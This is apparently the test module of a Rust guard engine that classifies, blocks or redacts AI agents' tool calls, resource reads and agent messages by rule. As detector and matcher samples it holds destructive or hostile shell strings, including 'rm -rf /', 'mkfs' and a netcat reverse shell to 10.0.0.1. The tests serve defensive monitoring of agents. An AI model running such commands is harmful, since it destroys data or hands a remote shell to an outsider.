    // ── Decision table ──────────────────────────────────────────────────
    //
    // The two matrices in this module's own doc comment are the specification;
    // what follows walks them cell by cell. `#[test]` and not `proptest`
    // deliberately: phase, scope, action and target are finite closed sets, so
    // the table IS the whole input space and a generator could only sample it.
    //
    // The `every_*` helpers each hold a `match` over the values they list. It
    // is not a check on the data — it is what makes a new enum variant fail to
    // COMPILE here, rather than silently leave a row of the matrix untested.

    fn every_phase() -> Vec<Phase> {
        let all = vec![Phase::Request, Phase::Response];
        for p in &all {
            match p {
                Phase::Request | Phase::Response => (),
            }
        }
        all
    }

    fn every_scope() -> Vec<Scope> {
        let all = vec![
            Scope::ToolDefinitions,
            Scope::ToolResults,
            Scope::ToolCalls,
            Scope::ResourceReads,
            Scope::PromptInvocations,
            Scope::AgentCalls,
        ];
        for s in &all {
            match s {
                Scope::ToolDefinitions
                | Scope::ToolResults
                | Scope::ToolCalls
                | Scope::ResourceReads
                | Scope::PromptInvocations
                | Scope::AgentCalls => (),
            }
        }
        all
    }

    fn every_action_kind() -> Vec<ActionKind> {
        let all = vec![
            ActionKind::Classify,
            ActionKind::Block,
            ActionKind::Replace,
            ActionKind::Substitute,
            ActionKind::InterceptOnly,
        ];
        for a in &all {
            match a {
                ActionKind::Classify
                | ActionKind::Block
                | ActionKind::Replace
                | ActionKind::Substitute
                | ActionKind::InterceptOnly => (),
            }
        }
        all
    }

    /// Every (phase, scope, action) triple, against the matrix in the module
    /// docs. A pair absent from the table permits NOTHING — which is why the
    /// walk covers all 60 cells rather than only the ones listed.
    #[test]
    fn the_phase_scope_action_matrix_is_the_documented_one() {
        use ActionKind::*;
        let allowed: &[(Phase, Scope, &[ActionKind])] = &[
            (
                Phase::Request,
                Scope::ToolDefinitions,
                &[Classify, Block, Substitute, InterceptOnly],
            ),
            (Phase::Request, Scope::ToolResults, &[Classify, Replace]),
            (Phase::Response, Scope::ToolCalls, &[Classify, Block, Replace]),
            (Phase::Request, Scope::ResourceReads, &[Classify, Block, Replace]),
            (Phase::Response, Scope::ResourceReads, &[Classify, Replace]),
            (
                Phase::Request,
                Scope::PromptInvocations,
                &[Classify, Block, Replace],
            ),
            (Phase::Request, Scope::AgentCalls, &[Classify, Block, Replace]),
            (Phase::Response, Scope::AgentCalls, &[Classify, Replace]),
        ];
        for phase in every_phase() {
            for scope in every_scope() {
                let permitted: &[ActionKind] = allowed
                    .iter()
                    .find(|(p, s, _)| *p == phase && *s == scope)
                    .map(|(_, _, a)| *a)
                    .unwrap_or(&[]);
                for action in every_action_kind() {
                    let expected = permitted.contains(&action);
                    assert_eq!(
                        scope_allows_action(phase, scope, action),
                        expected,
                        "({phase:?}, {scope:?}, {action:?}) should be {}",
                        if expected { "allowed" } else { "refused" }
                    );
                }
            }
        }
    }

    /// Every (scope, target) pair. Each scope is walked against the FULL target
    /// vocabulary, not only its own row: a row is pinned only when its refusals
    /// are pinned too, and every target here is legal in some other scope.
    #[test]
    fn the_scope_target_matrix_is_the_documented_one() {
        let every_target = [
            "tool_id",
            "any_arg",
            "content",
            "resource_id",
            "uri",
            "prompt_id",
            "data",
            "arg.path",
            "argv",
            "argv[0]",
            // Refused in EVERY scope, and named here so it stays that way: `args` is a
            // retired spelling of `any_arg`, and a rule carrying it must not validate.
            "args",
            // Refused in EVERY scope, like `args`: the documented target is `arg.<f>`,
            // and the bare prefix resolves to the empty field name — a rule that stores,
            // displays, and never matches. Named here so the refusal cannot regress into
            // dead config an operator believes is a guard.
            "arg.",
        ];
        let allowed: &[(Scope, &[&str])] = &[
            (Scope::ToolDefinitions, &["tool_id"]),
            (
                Scope::ToolResults,
                &["tool_id", "any_arg", "content", "arg.path", "argv", "argv[0]"],
            ),
            (
                Scope::ToolCalls,
                &["tool_id", "any_arg", "arg.path", "argv", "argv[0]"],
            ),
            (
                Scope::ResourceReads,
                &["resource_id", "uri", "content", "arg.path"],
            ),
            (Scope::PromptInvocations, &["prompt_id", "arg.path"]),
            (Scope::AgentCalls, &["content", "data"]),
        ];
        for scope in every_scope() {
            let permitted: &[&str] = allowed
                .iter()
                .find(|(s, _)| *s == scope)
                .map(|(_, t)| *t)
                .unwrap_or(&[]);
            for target in every_target {
                assert_eq!(
                    scope_allows_target(scope, target),
                    permitted.contains(&target),
                    "{scope:?} × {target}"
                );
            }
        }
    }

    /// `argv[+1]` is the case that separates the two halves of the guard: the
    /// index is non-empty and not all decimal, yet `usize::from_str` accepts a
    /// leading `+`. Reading it as an index would let two spellings address one
    /// token, so it is not an argv target at all.
    #[test]
    fn parse_argv_target_reads_only_plain_decimal_indices() {
        assert_eq!(parse_argv_target("argv"), Some(None));
        assert_eq!(parse_argv_target("argv[0]"), Some(Some(0)));
        assert_eq!(parse_argv_target("argv[12]"), Some(Some(12)));
        for malformed in [
            "argv[+1]",
            "argv[]",
            "argv[-1]",
            "argv[0x2]",
            "argv[ 1]",
            "argv[1",
            "argv0]",
            "argvv",
            "arg.v",
            "",
        ] {
            assert_eq!(parse_argv_target(malformed), None, "{malformed}");
        }
        assert_eq!(parse_argv_target("argv[99999999999999999999999999]"), None);
    }

    /// Each resolver is the only thing standing between a rule's target string
    /// and the value it matches against, so a wrong arm is not a wrong answer —
    /// it is a rule that silently never fires. Every scope's row is walked, and
    /// so are the targets it must NOT answer.
    #[test]
    fn a_tool_result_resolves_every_target_its_scope_names() {
        let set = FieldProfileSet::new(vec![fp(
            "shell_exec",
            "Bash",
            "command",
            Normalizer::Shell,
            100,
        )]);
        let args = json!({"command": "rm  -rf  /"});
        let r = ToolResultResolver {
            name: "Bash",
            arguments: Some(&args),
            content: "exit status 0",
            field_profiles: Some(&set),
            app_id: None,
            mcp_server: None,
            tool_id: Some("shell_exec"),
        };
        assert_eq!(sole_form(r.resolve("tool_id")).as_deref(), Some("shell_exec"));
        assert_eq!(sole_form(r.resolve("content")).as_deref(), Some("exit status 0"));
        assert_eq!(sole_form(r.resolve("arg.command")).as_deref(), Some("rm -rf /"));
        assert_eq!(sole_form(r.resolve("any_arg")).as_deref(), Some("rm -rf /"));
        assert_eq!(sole_form(r.resolve("argv[0]")).as_deref(), Some("rm"));
        // `arg.` is a prefix guard, and it is what keeps `argv[0]` on the argv
        // arm and `arg.command` off it. A field the arguments don't carry, and
        // a target that merely looks similar, both resolve to nothing.
        assert_eq!(r.resolve("arg.absent"), None);
        assert_eq!(r.resolve("argument.command"), None);
        assert_eq!(r.resolve("resource_id"), None);
        assert_eq!(r.resolve("nonsense"), None);
        assert_eq!(r.resolve("arg"), None);
        assert_eq!(r.resolve("arg."), None);
    }

    #[test]
    fn a_resource_read_resolves_every_target_its_scope_names() {
        let set = FieldProfileSet::new(vec![fp(
            "db_row",
            "postgres://*",
            "table",
            Normalizer::Raw,
            100,
        )]);
        let args = json!({"table": "customers"});
        let response_phase = ResourceReadResolver {
            resource_id: Some("db_row"),
            uri: "postgres://prod/customers",
            arguments: Some(&args),
            content: "id,name\n1,ada",
            field_profiles: Some(&set),
            app_id: None,
            mcp_server: None,
        };
        assert_eq!(
            sole_form(response_phase.resolve("resource_id")).as_deref(),
            Some("db_row")
        );
        assert_eq!(
            sole_form(response_phase.resolve("uri")).as_deref(),
            Some("postgres://prod/customers")
        );
        assert_eq!(
            sole_form(response_phase.resolve("content")).as_deref(),
            Some("id,name\n1,ada")
        );
        assert_eq!(sole_form(response_phase.resolve("arg.table")).as_deref(), Some("customers"));
        assert_eq!(response_phase.resolve("tool_id"), None);
        assert_eq!(response_phase.resolve("nonsense"), None);
        // `arg` is the prefix without its dot, and it is SHORTER than the prefix — the
        // boundary a guard that stopped discriminating would read straight past.
        assert_eq!(response_phase.resolve("arg"), None);
        assert_eq!(response_phase.resolve("arg."), None);

        // Request phase carries no body, and `content` must then resolve to
        // NOTHING rather than to the empty string — a `content` rule that fired
        // request-side would match every read before anything was read.
        let request_phase = ResourceReadResolver {
            content: "",
            ..response_phase
        };
        assert_eq!(request_phase.resolve("content"), None);
        assert_eq!(sole_form(request_phase.resolve("uri")).as_deref(), Some("postgres://prod/customers"));
    }

    #[test]
    fn a_prompt_invocation_resolves_every_target_its_scope_names() {
        let set = FieldProfileSet::new(vec![fp(
            "coding_rules",
            "house_style",
            "language",
            Normalizer::Raw,
            100,
        )]);
        let args = json!({"language": "rust"});
        let r = PromptInvocationResolver {
            prompt_id: Some("coding_rules"),
            name: "house_style",
            arguments: Some(&args),
            field_profiles: Some(&set),
            app_id: None,
            mcp_server: None,
        };
        assert_eq!(sole_form(r.resolve("prompt_id")).as_deref(), Some("coding_rules"));
        assert_eq!(sole_form(r.resolve("arg.language")).as_deref(), Some("rust"));
        assert_eq!(r.resolve("arg.absent"), None);
        assert_eq!(r.resolve("content"), None);
        assert_eq!(r.resolve("tool_id"), None);
        assert_eq!(r.resolve("nonsense"), None);
        assert_eq!(r.resolve("arg"), None);
        assert_eq!(r.resolve("arg."), None);
    }

    /// An A2A call names no tool and carries no arguments, so its resolver has
    /// exactly two answers — and an empty one is still an answer: a rule
    /// targeting the part the message did not carry must evaluate against the
    /// empty string, not fall through to some other target.
    #[test]
    fn an_agent_call_resolves_content_and_data_and_nothing_else() {
        let r = AgentCallResolver {
            content: "summarise the incident",
            data: r#"{"ticket":42}"#,
        };
        assert_eq!(sole_form(r.resolve("content")).as_deref(), Some("summarise the incident"));
        assert_eq!(sole_form(r.resolve("data")).as_deref(), Some(r#"{"ticket":42}"#));
        assert_eq!(r.resolve("tool_id"), None);
        assert_eq!(r.resolve("arg.anything"), None);
        assert_eq!(r.resolve("nonsense"), None);

        // A message with no structured parts still ANSWERS on `data` — with the
        // empty string. `None` would make the condition fail for a different
        // reason than "the data did not match", which is the distinction a
        // `drop`-on-no-match rule turns on. Note this is the OPPOSITE of
        // `resource_reads`, where an empty `content` resolves to `None` so that a
        // content rule cannot fire request-side, before anything has been read.
        // Same target name, two scopes, two deliberate answers.
        let text_only = AgentCallResolver {
            content: "hello",
            data: "",
        };
        assert_eq!(sole_form(text_only.resolve("data")).as_deref(), Some(""));
    }

    /// The word-boundary scan, at both edges and at the length boundary. The
    /// needle-longer-than-haystack guard is not an optimisation: the loop below
    /// it computes `h.len() - n.len()`, which underflows without it.
    #[test]
    fn contains_word_anchors_at_both_edges_and_refuses_an_oversized_needle() {
        // Boundary: a needle exactly as long as the haystack is the whole word.
        assert!(contains_word("reboot", "reboot"));
        // Both edges, one at a time.
        assert!(contains_word("reboot now", "reboot"));
        assert!(contains_word("sudo reboot", "reboot"));
        assert!(contains_word("sudo reboot now", "reboot"));
        // Word characters on either side are not boundaries.
        assert!(!contains_word("rebooted", "reboot"));
        assert!(!contains_word("prereboot", "reboot"));
        assert!(!contains_word("reboot_now", "reboot"));
        // Non-word characters are.
        assert!(contains_word("reboot;now", "reboot"));
        assert!(contains_word("--reboot", "reboot"));
        // Neither degenerate input may reach the loop.
        assert!(!contains_word("ab", "abcd"));
        assert!(!contains_word("", "abcd"));
        assert!(!contains_word("abc", ""));
        assert!(!contains_word("", ""));
    }

    fn every_op() -> Vec<Op> {
        let all = vec![
            Op::Glob,
            Op::ContainsAny,
            Op::ContainsWordAny,
            Op::Regex,
            Op::Equals,
            Op::In,
            Op::Detector,
        ];
        for o in &all {
            match o {
                Op::Glob
                | Op::ContainsAny
                | Op::ContainsWordAny
                | Op::Regex
                | Op::Equals
                | Op::In
                | Op::Detector => (),
            }
        }
        all
    }

    /// One rule, on every operator: **an empty pattern matches nothing.**
    /// `validate` refuses to store one, so a condition carrying one arrived
    /// from a newer admin or a hand-edited row — and an empty pattern that
    /// matched everything would silently widen a narrow rule into a blanket
    /// one, which is the direction that costs something.
    ///
    /// Each operator also gets a live pattern that matches and one that does
    /// not. Both are load-bearing: a guard asserted only by its refusals goes
    /// on passing after the operator stops matching at all, and one asserted
    /// only by its matches goes on passing after it starts matching
    /// everything.
    #[test]
    fn an_empty_pattern_matches_nothing_on_every_operator() {
        // op, empty pattern, one that matches the subject, one that does not, subject
        let table: Vec<(Op, Value, Value, Value, &str)> = vec![
            (Op::Glob, json!(""), json!("*reboot*"), json!("*mkfs*"), "sudo reboot"),
            (Op::ContainsAny, json!([""]), json!(["boot"]), json!(["mkfs"]), "rebooted"),
            (
                Op::ContainsWordAny,
                json!([""]),
                json!(["reboot"]),
                json!(["mkfs"]),
                "please reboot now",
            ),
            (Op::Regex, json!(""), json!("re+boot"), json!("mkfs"), "please reboot now"),
            (Op::Equals, json!(""), json!("shell_exec"), json!("read_file"), "shell_exec"),
            (Op::In, json!([""]), json!(["shell_exec"]), json!(["read_file"]), "shell_exec"),
            (
                Op::Detector,
                json!(""),
                json!("is_reverse_shell"),
                json!("is_imds_request"),
                "nc -e /bin/sh 10.0.0.1 4444",
            ),
        ];
        for op in every_op() {
            let (_, empty, hit, miss, subject) = table
                .iter()
                .find(|(o, ..)| *o == op)
                .unwrap_or_else(|| panic!("{op:?} has no row in the operator table"));
            let cond = |value: &Value| MatchCondition {
                target: "any_arg".to_string(),
                op,
                value: value.clone(),
            };
            assert!(
                !condition_matches(&cond(empty), subject),
                "{op:?}: an empty pattern must match nothing"
            );
            assert!(
                condition_matches(&cond(hit), subject),
                "{op:?}: the live pattern must match"
            );
            assert!(
                !condition_matches(&cond(miss), subject),
                "{op:?}: a pattern that does not match must not match"
            );
        }
    }

    /// The list-valued operators, on the shapes a scalar one cannot have: an
    /// empty list, a value that is not a list at all, and a list holding a
    /// non-string. Each must match nothing rather than fall through.
    #[test]
    fn a_list_operator_given_no_usable_list_matches_nothing() {
        for op in [Op::ContainsAny, Op::ContainsWordAny, Op::In] {
            let cond = |value: Value| MatchCondition {
                target: "any_arg".to_string(),
                op,
                value,
            };
            for value in [json!([]), json!("not-a-list"), json!(null), json!([7])] {
                assert!(
                    !condition_matches(&cond(value.clone()), "shell_exec"),
                    "{op:?} with {value}"
                );
            }
            // Positive control, in this test rather than a sibling: without it every
            // assertion above still passes with the operator matching nothing at all,
            // which is the state they exist to distinguish from.
            assert!(
                condition_matches(&cond(json!(["shell_exec"])), "shell_exec"),
                "{op:?} must still match a usable list"
            );
        }
    }

    /// `classify_tool_call` builds the axes a rule's filters are matched
    /// against. A dropped axis does not fail — it makes every rule filtered on
    /// that axis stop firing, silently.
    #[test]
    fn classify_tool_call_carries_the_model_and_mcp_server_axes() {
        let profiles = FieldProfileSet::new(vec![fp(
            "shell_exec",
            "Bash",
            "command",
            Normalizer::Shell,
            100,
        )]);
        let model_scoped = Rule {
            model_filter: Some("gpt-4*".to_string()),
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        let hit = classify_tool_call(
            std::slice::from_ref(&model_scoped),
            Some("gpt-4o"),
            None,
            Some(&profiles),
            "Bash",
            None,
        );
        assert_eq!(hit.risk, "danger", "the model axis must reach the filter");
        let miss = classify_tool_call(
            std::slice::from_ref(&model_scoped),
            Some("claude-3"),
            None,
            Some(&profiles),
            "Bash",
            None,
        );
        assert_eq!(miss.risk, "unknown", "a different model must not match");

        let mcp_profiles = FieldProfileSet::new(vec![{
            let mut p = fp("read_file", "read_file", "path", Normalizer::Path, 100);
            p.mcp_server = Some("filesystem".to_string());
            p
        }]);
        let server_scoped = Rule {
            mcp_server_filter: Some("filesystem".to_string()),
            ..classify_rule_for_tool_id("read_file", "caution")
        };
        let mcp_hit = classify_tool_call(
            std::slice::from_ref(&server_scoped),
            None,
            None,
            Some(&mcp_profiles),
            "mcp__filesystem__read_file",
            None,
        );
        assert_eq!(
            mcp_hit.risk, "caution",
            "the mcp_server axis must reach the filter"
        );
    }

    /// The two operator-visible strings on a `RiskResult`. Both are read by the
    /// UI and by the audit chip, and both are derived rather than stored — an
    /// empty one reads as "no rule matched" on a row where one did.
    #[test]
    fn a_risk_result_reports_the_action_and_the_pattern_that_matched() {
        let profiles = FieldProfileSet::new(vec![fp(
            "shell_exec",
            "Bash",
            "command",
            Normalizer::Shell,
            100,
        )]);
        let cases: Vec<(RuleAction, &str)> = vec![
            (RuleAction::Classify, "classify"),
            (RuleAction::Block, "block"),
            (
                RuleAction::Replace {
                    regex: None,
                    with: Some("[gone]".to_string()),
                    drop: false,
                },
                "replace",
            ),
        ];
        for (action, expected) in cases {
            let rule = Rule {
                action,
                ..classify_rule_for_tool_id("shell_exec", "danger")
            };
            let out = classify_tool_call(&[rule], None, None, Some(&profiles), "Bash", None);
            assert_eq!(out.action, expected);
            assert_eq!(
                out.pattern.as_deref(),
                Some("shell_exec"),
                "the pattern is the matched condition's own value"
            );
        }
        // A list-valued op summarises as the joined list, not as the first item.
        let listed = Rule {
            conditions: vec![MatchCondition {
                target: "tool_id".to_string(),
                op: Op::In,
                value: json!(["shell_exec", "read_file"]),
            }],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        };
        let out = classify_tool_call(&[listed], None, None, Some(&profiles), "Bash", None);
        assert_eq!(out.pattern.as_deref(), Some("shell_exec, read_file"));
        // No rule matched: the synthetic fallback, whose action is `allow`.
        let none = classify_tool_call(&[], None, None, Some(&profiles), "Bash", None);
        assert_eq!(none.action, "allow");
        assert_eq!(none.pattern, None);
    }

    /// The priority a rule gets when the wire omits it. It is the sort key for
    /// the whole engine, so a different default silently reorders every rule an
    /// operator never set one on.
    #[test]
    fn a_rule_omitting_priority_deserialises_to_the_documented_default() {
        let r: Rule = serde_json::from_value(json!({
            "id": "ASI02-06",
            "risk": "danger",
            "phase": "response",
            "scope": "tool_calls",
            "conditions": [{"target": "tool_id", "op": "equals", "value": "shell_exec"}],
            "action": {"kind": "block"},
        }))
        .expect("a rule with only its required fields must deserialise");
        assert_eq!(r.priority, 100);
        assert!(r.enabled, "a rule is enabled unless the wire says otherwise");
    }

    /// Every rule names itself: the id is what a blocked-tool banner, a
    /// transform diff and the activity map key on, so a rule without one does
    /// not decode. The same rule with its id is the control.
    #[test]
    fn a_rule_without_an_id_does_not_deserialise() {
        let mut rule = json!({
            "risk": "danger",
            "phase": "response",
            "scope": "tool_calls",
            "match": [{"target": "tool_id", "op": "equals", "value": "shell_exec"}],
            "action": {"kind": "block"},
        });
        assert!(serde_json::from_value::<Rule>(rule.clone()).is_err());
        rule["id"] = json!("ASI02-06");
        let r: Rule = serde_json::from_value(rule).expect("the same rule with its id decodes");
        assert_eq!(r.id, "ASI02-06");
    }

    /// A needle carrying the form separator is refused for the same reason an
    /// empty one is: no canonical value can contain it, so the rule would store,
    /// display, and never fire. The same needles without it are the control.
    #[test]
    fn validate_refuses_a_needle_that_carries_the_form_separator() {
        let base = classify_rule_for_tool_id("shell_exec", "danger");
        let with = |op: Op, value: Value| Rule {
            conditions: vec![MatchCondition {
                target: "arg.command".to_string(),
                op,
                value,
            }],
            ..base.clone()
        };
        assert_matches!(validate(&with(Op::ContainsAny, json!(["rm -rf"]))), Ok(()));
        assert_matches!(validate(&with(Op::Glob, json!("*/etc/*"))), Ok(()));
        assert_matches!(
            validate(&with(Op::ContainsAny, json!(["rm\u{0}-rf"]))),
            Err(ValidationError::NeedleCarriesFormSeparator { .. })
        );
        assert_matches!(
            validate(&with(Op::Glob, json!("*/etc\u{0}/*"))),
            Err(ValidationError::NeedleCarriesFormSeparator { .. })
        );
    }

    /// A list-valued condition must carry at least one non-empty string. The
    /// accepted case is the control: an empty needle is refused HERE precisely
    /// so the matcher never has to decide what one means.
    #[test]
    fn validate_refuses_an_array_value_that_holds_an_empty_string() {
        let base = classify_rule_for_tool_id("shell_exec", "danger");
        let with_value = |value: Value| Rule {
            conditions: vec![MatchCondition {
                target: "any_arg".to_string(),
                op: Op::ContainsWordAny,
                value,
            }],
            ..base.clone()
        };
        assert_matches!(validate(&with_value(json!(["reboot"]))), Ok(()));
        assert_matches!(validate(&with_value(json!(["reboot", "mkfs"]))), Ok(()));
        assert_matches!(
            validate(&with_value(json!([]))),
            Err(ValidationError::InvalidArrayValue)
        );
        assert_matches!(
            validate(&with_value(json!(["reboot", ""]))),
            Err(ValidationError::InvalidArrayValue)
        );
        assert_matches!(
            validate(&with_value(json!([""]))),
            Err(ValidationError::InvalidArrayValue)
        );
        assert_matches!(
            validate(&with_value(json!(["reboot", 7]))),
            Err(ValidationError::InvalidArrayValue)
        );
        assert_matches!(
            validate(&with_value(json!("reboot"))),
            Err(ValidationError::InvalidArrayValue)
        );
    }

    /// `Replace` with every field at its default rewrites the match to the
    /// `[redacted]` sentinel — almost never what the operator meant. Each of
    /// the three explicit choices stands on its own, and all three must, or the
    /// refusal below would be rejecting a legitimate rule instead.
    #[test]
    fn validate_requires_replace_to_name_one_explicit_choice() {
        let base = classify_rule_for_tool_id("shell_exec", "danger");
        let with_action = |action: RuleAction| Rule {
            action,
            ..base.clone()
        };
        for explicit in [
            RuleAction::Replace {
                regex: Some("sk-[a-z0-9]+".to_string()),
                with: None,
                drop: false,
            },
            RuleAction::Replace {
                regex: None,
                with: Some("[gone]".to_string()),
                drop: false,
            },
            RuleAction::Replace {
                regex: None,
                with: None,
                drop: true,
            },
        ] {
            assert_matches!(validate(&with_action(explicit)), Ok(()));
        }
        assert_matches!(
            validate(&with_action(RuleAction::Replace {
                regex: None,
                with: None,
                drop: false,
            })),
            Err(ValidationError::AmbiguousReplaceAction)
        );
    }

    /// Tier precedence through the GLOB path. The literal index and the glob
    /// list are separate lookups that both have to respect the tier, and the
    /// existing precedence cases all register literal patterns — so a glob
    /// profile matching out of its own tier is invisible to them.
    #[test]
    fn a_glob_profile_only_matches_inside_its_own_tier() {
        let generic = fp("generic_read", "read*", "path", Normalizer::Path, 100);
        let scoped = {
            let mut p = fp("fs_read", "read*", "path", Normalizer::Path, 100);
            p.mcp_server = Some("filesystem".to_string());
            p
        };
        let set = FieldProfileSet::new(vec![generic, scoped]);
        // The MCP tier is probed first and wins when its scope key is present.
        assert_eq!(
            set.resolve_tool_id("read_file", None, Some("filesystem")),
            Some("fs_read")
        );
        // With no MCP scope the MCP-tier profile is not a candidate at all, and
        // the generic one answers — it is not that it merely ranks lower.
        assert_eq!(
            set.resolve_tool_id("read_file", None, None),
            Some("generic_read")
        );
        // A different server does not reach the profile scoped to `filesystem`.
        assert_eq!(
            set.resolve_tool_id("read_file", None, Some("postgres")),
            Some("generic_read")
        );
        assert_eq!(set.resolve_tool_id("write_file", None, None), None);
    }

    /// The same tier discipline on the all-fields lookup that backs `any_arg` —
    /// a different code path from `find_tool_profile`, with its own tier test.
    /// The two profiles differ only in NORMALISER, which is what makes the
    /// resolved value say which tier answered: the identity normaliser leaves
    /// the spacing that `shell` folds.
    #[test]
    fn any_arg_over_glob_profiles_takes_the_higher_tier_normaliser() {
        let generic = fp("generic_exec", "*sh", "command", Normalizer::Raw, 100);
        let scoped = {
            let mut p = fp("app_exec", "*sh", "command", Normalizer::Shell, 100);
            p.app_filter = Some("claude-code".to_string());
            p
        };
        let set = FieldProfileSet::new(vec![generic, scoped]);
        let args = json!({"command": "rm   -rf   /"});
        let resolve_for = |app: Option<&str>| {
            ToolCallResolver {
                name: "bash",
                arguments: Some(&args),
                field_profiles: Some(&set),
                app_id: app,
                mcp_server: None,
                tool_id: None,
            }
            .resolve("any_arg")
        };
        assert_eq!(sole_form(resolve_for(Some("claude-code"))).as_deref(), Some("rm -rf /"));
        assert_eq!(sole_form(resolve_for(Some("cursor"))).as_deref(), Some("rm   -rf   /"));
        assert_eq!(sole_form(resolve_for(None)).as_deref(), Some("rm   -rf   /"));
    }

    #[test]
    fn a_profile_set_reports_its_own_contents() {
        let empty = FieldProfileSet::new(vec![]);
        assert_eq!(empty.len(), 0);
        assert!(empty.is_empty());
        assert_eq!(empty.iter().count(), 0);

        let two = FieldProfileSet::new(vec![
            fp("shell_exec", "Bash", "command", Normalizer::Shell, 100),
            fp("read_file", "Read", "path", Normalizer::Path, 100),
        ]);
        assert_eq!(two.len(), 2);
        assert!(!two.is_empty());
        assert_eq!(two.iter().count(), 2);
        let mut ids: Vec<&str> = two.iter().map(|p| p.tool_id.as_str()).collect();
        ids.sort_unstable();
        assert_eq!(ids, ["read_file", "shell_exec"]);
    }

    /// Pipe-alternation is the only compound syntax the glob matcher has, and
    /// this split is what lets a purely literal alternation be indexed. An
    /// empty alternate must be DROPPED: registered, it would be a literal key
    /// matching the empty tool name.
    #[test]
    fn pattern_alternates_splits_on_pipes_and_drops_the_empties() {
        assert_eq!(pattern_alternates("Read|Edit"), vec!["Read", "Edit"]);
        assert_eq!(pattern_alternates(" Read | Edit "), vec!["Read", "Edit"]);
        assert_eq!(pattern_alternates("Read"), vec!["Read"]);
        assert_eq!(pattern_alternates("Read||Edit|"), vec!["Read", "Edit"]);
        assert!(pattern_alternates("||").is_empty());
        assert!(pattern_alternates("").is_empty());

        assert!(alternate_is_literal("Read"));
        assert!(alternate_is_literal("read_file"));
        assert!(!alternate_is_literal("*read*"));
        assert!(!alternate_is_literal("read*"));
    }

    /// The underscore is the only punctuation a `field` or `tool_id` may carry,
    /// and every existing case for this guard is a rejection. Without the
    /// accepting one the guard would keep passing with `_` itself refused —
    /// which would reject `shell_exec`, the canonical id in every seed.
    #[test]
    fn a_profile_may_use_the_underscore_that_is_its_only_punctuation() {
        let mut p = fp("shell_exec", "Bash", "target_file", Normalizer::Path, 100);
        p.wire_field = Some("targetFile".to_string());
        assert_matches!(validate_field_profile(&p), Ok(()));

        let plain = fp("readfile", "Read", "path", Normalizer::Path, 100);
        assert_matches!(validate_field_profile(&plain), Ok(()));
    }

    /// The `server_type` autocomplete list. It is a suggestion rather than a
    /// gate, so nothing else fails when it empties — the UI just silently stops
    /// offering the tags the protocol parsers actually stamp.
    #[test]
    fn known_server_tool_types_names_every_tag_the_parsers_stamp() {
        let known = known_server_tool_types();
        let tags: Vec<&str> = known.iter().map(|k| k.server_type.as_str()).collect();
        assert_eq!(
            tags,
            ["web_search_20250305", "web_search_preview", "google_search"]
        );
        assert!(
            known
                .iter()
                .all(|k| !k.label.is_empty() && !k.description.is_empty()),
            "every entry carries the label and description the UI renders"
        );
    }

}
